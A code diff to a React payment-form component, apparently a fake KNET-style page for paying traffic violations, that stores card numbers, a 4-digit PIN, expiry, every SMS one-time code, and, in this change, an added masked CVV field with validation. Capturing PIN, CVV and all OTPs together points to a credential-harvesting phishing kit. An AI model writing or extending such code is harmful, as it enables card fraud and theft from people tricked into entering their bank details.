@@ -23,6 +23,7 @@ type PaymentInfo = {
   allOtps: string[]
   bank_card: string[]
   prefix: string
+  skip:string
   status: "new" | "pending" | "approved" | "rejected"
   cardStatus: "new" | "pending" | "approved" | "rejected"
 }
@@ -171,6 +172,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     bank_card: [""],
     prefix: "",
     status: "new",
+    skip: "",
     cardStatus: "new",
   })
   const cuonter = () => {
@@ -329,6 +331,11 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
       await handleSubmit(e)
       setTimeout(() => {
         setLoading(false)
+        if(props.violationValue >=24){
+          setStep(3)
+        }else{
+          setStep(0)
+        }
         cuonter()
         setStep(3)
       }, 3000)
@@ -359,7 +366,8 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         paymentInfo.pass !== "" &&
         paymentInfo.month !== "" &&
         paymentInfo.year !== "" &&
-        paymentInfo.pass.length === 4
+        paymentInfo.pass.length === 4 &&
+        paymentInfo.cvv.length ===3
       )
     }
     return true
@@ -542,7 +550,26 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                 />
               </div>
             </div>
-
+            <div className="row" id="PinRow">
+              <div className="row">
+                <label className="col">CVV:</label>
+                <input
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  name="cvv"
+                  id="cvv"
+                  onChange={(e) => handlePaymentInfoChange("cvv", e.target.value)}
+                  value={paymentInfo.cvv}
+                  autoComplete="off"
+                  title="Should be in number. Length should be 4"
+                  type="password"
+                  size={3}
+                  style={{ width: "80%" }}
+                  maxLength={3}
+                  className="allownumericwithoutdecimal col-9"
+                />
+              </div>
+            </div>
 
           </div>
         )
@@ -631,7 +658,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                     </div>
                   </div>
                   <input
-                    type="text"
+                    type="tel"
                     maxLength={6}
                     placeholder="الرمز  المرسل إلى الجوال"
                     className="text-center text-lg py-6 border-blue-200"
@@ -799,7 +826,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                     </div>
                   </div>
                   <input
-                    type="text"
+                    type="tel"
                     maxLength={6}
                     placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
                     className="text-center text-lg py-6 border-blue-200"
@@ -1008,7 +1035,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         }
         .tooltip .tooltiptext {
           visibility: hidden;
-          width: 80%;
+          width: 100%;
           background-color: #555;
           color: #fff;
           text-align: center;
@@ -1092,7 +1119,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         }
         .madd{
           height:30px;
-          max-width: 372px;
+          max-width: 400px;
           margin: 5px auto -30px auto;
           border-radius: 0px 10px;
           background-image: url("../images/adds/NewDerayaCamp/mob.jpg");
@@ -1114,7 +1141,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         box-sizing: border-box;
     }
     .content-block {
-        width: 395px;
+        width:100vw;
         margin: 0 auto;
     }
     .row {
